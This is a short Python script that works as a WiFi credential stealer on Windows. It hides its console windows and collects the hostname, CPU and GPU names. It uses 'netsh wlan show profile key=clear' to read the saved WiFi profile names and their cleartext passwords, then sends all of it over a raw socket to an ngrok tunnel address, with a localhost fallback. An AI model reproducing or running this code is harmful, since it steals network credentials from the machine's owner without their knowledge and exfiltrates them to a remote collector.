import subprocess
import socket
import ngrok

results2 = ""
CREATE_NO_WINDOW = 0x08000000

wifiCommand = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
systemNameCommand = subprocess.check_output(['hostname'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
cpuCommand = subprocess.check_output(['wmic', 'cpu', 'get', 'name'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
gpuCommand = subprocess.check_output(['wmic', 'path', 'win32_videocontroller', 'get', 'name'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')

try:
    print(systemNameCommand[0])
    results2 = "System Name: " + systemNameCommand[0] + "\n"
except:
    results2 = "SYSTEM NAME UNAVAILABLE" + "\n"

try:
    print(cpuCommand[1])
    results2 += "CPU: " + cpuCommand[1] + "\n"
except:
    results2 += "CPU NAME UNAVAILABLE" + "\n"

try:
    print(gpuCommand[1])
    results2 += "GPU: " + gpuCommand[1] + "\n\n"
except:
    results2 += "GPU NAME UNAVAILABLE" + "\n\n"

results2 += "WiFi Results\n"
profiles = [i.split(":")[1][1:-1] for i in wifiCommand if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        print ("{:<50}|  {:<}".format(i, results[0]))
        results2 += "{:<50}|  {:<}".format(i, results[0])
        results2 += "\n"
    except IndexError:
        print ("{:<50}|  {:<}".format(i, ""))

print(results2)
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Connect to the listening server address
    client_socket.connect(('0.tcp.au.ngrok.io', 11775))
    
    # Send the encoded data payload
    client_socket.sendall(results2.encode('utf-8'))

except:
    print("Connect error occurred. Attempt to open alternate.")
    client_socket.connect(('127.0.0.1', 8080))
    client_socket.sendall(results2.encode('utf-8'))
    
finally:
    client_socket.close()